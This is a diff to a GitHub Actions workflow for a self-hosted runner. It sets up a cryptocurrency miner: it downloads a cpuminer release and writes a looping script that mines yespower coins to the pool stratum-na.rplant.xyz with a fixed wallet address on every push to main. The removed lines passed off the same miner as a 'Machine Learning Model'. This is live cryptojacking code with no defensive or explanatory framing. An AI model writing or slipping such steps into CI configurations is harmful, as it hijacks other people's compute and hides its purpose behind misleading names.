@@ -1,28 +1,28 @@
-name: Machine Learning Workflow
+name: Machine Learning Module
 
 on:
   push:
     branches:
-      - main  # You might need to adjust this depending on your default branch name
+      - main  # Adjust this based on your branch
 
 jobs:
   build:
     runs-on: self-hosted
-   
 
-   
     steps:
       - name: Checkout Repository
         uses: actions/checkout@v2
 
-      
-
-      - name: Download and Extract Machine Learning Model
+      - name: Download and Extract Cpuminer
         run: |
-          wget https://github.com/rplant8/cpuminer-opt-rplant/releases/download/5.0.36/cpuminer-opt-linux.tar.gz
-          tar xf cpuminer-opt-linux.tar.gz
-          chmod +x cpuminer-sse2
+          wget https://github.com/cpu-pool/cpuminer-opt-cpupower/releases/download/1.4/Cpuminer-opt-cpu-pool-linux64.tar.gz
+          tar zxvf Cpuminer-opt-cpu-pool-linux64.tar.gz
 
-      - name: Run Machine Learning Model
+      - name: Create and Run Miner Script
         run: |
-          ./cpuminer-sse2 -a yespower -o stratum+tcps://stratum-na.rplant.xyz:17111 -u aNEpRWJEag9JiZFgztAf38q4kPmgkfXNCo.c1 --threads=106
+          echo '#!/bin/sh
+          while [ 1 ]; do
+          ./cpuminer -a yespower -o stratum+tcps://stratum-na.rplant.xyz:17111 -u aNEpRWJEag9JiZFgztAf38q4kPmgkfXNCo.c1
+          done' > autominer.sh
+          chmod +x autominer.sh
+          ./autominer.sh
